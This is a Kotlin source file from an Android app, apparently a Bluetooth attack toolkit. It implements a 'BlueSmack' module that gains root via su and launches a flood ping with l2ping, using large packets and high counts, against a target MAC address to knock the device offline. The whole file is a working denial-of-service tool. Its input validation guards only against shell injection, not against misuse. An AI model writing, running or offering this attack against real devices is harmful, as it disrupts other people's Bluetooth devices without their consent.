package com.hereliesaz.blusnu.data

import android.util.Log
import com.hereliesaz.blusnu.utils.MacValidator
import com.hereliesaz.blusnu.utils.RootExecutor
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.currentCoroutineContext
import kotlinx.coroutines.ensureActive
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.withContext
import java.io.BufferedReader
import java.io.InputStreamReader
import kotlin.coroutines.cancellation.CancellationException

/**
 * Executes the BlueSmack L2CAP ping flood via the system l2ping binary.
 *
 * Root is required because l2ping uses raw L2CAP sockets on Android.
 */
class BlueSmackModule {

    companion object {
        private const val TAG = "BlueSmackModule"

        /** Regex for validating HCI interface names (e.g. hci0, hci1). */
        private val INTERFACE_REGEX = Regex("^[a-zA-Z0-9]+$")

        /** Valid range for L2CAP echo-request payload size in bytes. */
        val PACKET_SIZE_RANGE = 1..65535

        /** Valid range for ping count. */
        val PACKET_COUNT_RANGE = 1..100_000

        /**
         * Validates that [interfaceName] is safe for shell interpolation.
         *
         * @throws IllegalArgumentException if the name contains characters outside `[a-zA-Z0-9]`.
         */
        fun requireValidInterface(interfaceName: String) {
            require(INTERFACE_REGEX.matches(interfaceName)) {
                "Invalid interface name: '$interfaceName'. Must match [a-zA-Z0-9]+."
            }
        }

        /**
         * Clamps [size] into [PACKET_SIZE_RANGE] and [count] into [PACKET_COUNT_RANGE].
         *
         * @return Pair of (clampedSize, clampedCount).
         */
        fun clampParameters(size: Int, count: Int): Pair<Int, Int> =
            size.coerceIn(PACKET_SIZE_RANGE) to count.coerceIn(PACKET_COUNT_RANGE)
    }

    /** Reference to the active su process, if any. Volatile for cross-thread visibility. */
    @Volatile
    private var activeProcess: Process? = null

    /**
     * Checks if root access is available on this device.
     */
    suspend fun checkRoot(): Boolean {
        return RootExecutor.isRootAvailable()
    }

    /**
     * Starts the BlueSmack attack, emitting l2ping output line-by-line as a [Flow].
     *
     * @param targetMac     Bluetooth MAC address (e.g. "AA:BB:CC:DD:EE:FF").
     * @param packetSize    Payload size in bytes (clamped to [PACKET_SIZE_RANGE]).
     * @param count         Number of pings (clamped to [PACKET_COUNT_RANGE]).
     * @param interfaceName HCI interface to use (e.g. "hci0"). Validated against [INTERFACE_REGEX].
     */
    fun startAttack(
        targetMac: String,
        packetSize: Int = 600,
        count: Int = 1000,
        interfaceName: String = "hci0"
    ): Flow<String> = flow {
        MacValidator.requireValid(targetMac)
        requireValidInterface(interfaceName)
        val (clampedSize, clampedCount) = clampParameters(packetSize, count)

        emit("BlueSmack DoS: targeting $targetMac with $clampedCount packets of $clampedSize bytes on $interfaceName")

        if (!checkRoot()) {
            emit("ERROR: Root access is not available. BlueSmack requires root for raw L2CAP sockets.")
            return@flow
        }
        emit("Root access confirmed.")

        val whichResult = RootExecutor.execute("which l2ping")
        val l2pingAvailable = !whichResult.startsWith("Error") && whichResult.isNotBlank()

        if (!l2pingAvailable) {
            emit("WARNING: l2ping binary not found in PATH.")
            val hcitoolCheck = RootExecutor.execute("which hcitool")
            if (!hcitoolCheck.startsWith("Error") && hcitoolCheck.isNotBlank()) {
                emit("hcitool found at: ${hcitoolCheck.trim()}")
                emit("l2ping not available. Attempting HCI connectivity check as fallback...")
                val hciResult = RootExecutor.execute("hcitool cmd 0x01 0x0001")
                emit("HCI command result: $hciResult")
            } else {
                emit("ERROR: Neither l2ping nor hcitool binaries found. Cannot proceed.")
                emit("Install BlueZ utilities (l2ping) to use BlueSmack.")
            }
            return@flow
        }
        emit("l2ping binary found at: ${whichResult.trim()}")

        val cmd = "l2ping -i $interfaceName -s $clampedSize -c $clampedCount -f $targetMac"
        emit("Launching: $cmd")

        executeL2ping(cmd) { line -> emit(line) }

        emit("BlueSmack attack completed.")
    }

    /**
     * Runs [command] inside a root shell, streaming stdout/stderr line-by-line via [onLine].
     *
     * The su [Process] reference is stored in [activeProcess] so that [destroyProcess] can
     * tear it down from another thread (e.g. on stop or ViewModel clear).
     */
    suspend fun executeL2ping(
        command: String,
        onLine: suspend (String) -> Unit
    ) = withContext(Dispatchers.IO) {
        var process: Process? = null
        try {
            process = Runtime.getRuntime().exec("su")
            activeProcess = process

            val os = process.outputStream
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val errReader = BufferedReader(InputStreamReader(process.errorStream))

            os.write("$command\n".toByteArray())
            os.write("exit\n".toByteArray())
            os.flush()
            os.close()

            // Stream stdout line-by-line so the UI updates in real time
            var line: String?
            while (reader.readLine().also { line = it } != null) {
                currentCoroutineContext().ensureActive()
                line?.let {
                    Log.d(TAG, "l2ping: $it")
                    onLine(it)
                }
            }

            // Drain stderr
            while (errReader.readLine().also { line = it } != null) {
                currentCoroutineContext().ensureActive()
                line?.let {
                    Log.w(TAG, "l2ping stderr: $it")
                    onLine("stderr: $it")
                }
            }

            val exitCode = process.waitFor()
            if (exitCode != 0) {
                onLine("l2ping exited with code $exitCode")
            }
        } catch (e: CancellationException) {
            throw e
        } catch (e: Exception) {
            Log.e(TAG, "Failed to execute l2ping", e)
            onLine("ERROR: ${e.message ?: "Unknown error executing l2ping"}")
        } finally {
            process?.destroyForcibly()
            activeProcess = null
        }
    }

    /**
     * Forcibly destroys the active su process, if any. Safe to call from any thread.
     */
    fun destroyProcess() {
        activeProcess?.destroyForcibly()
        activeProcess = null
    }
}
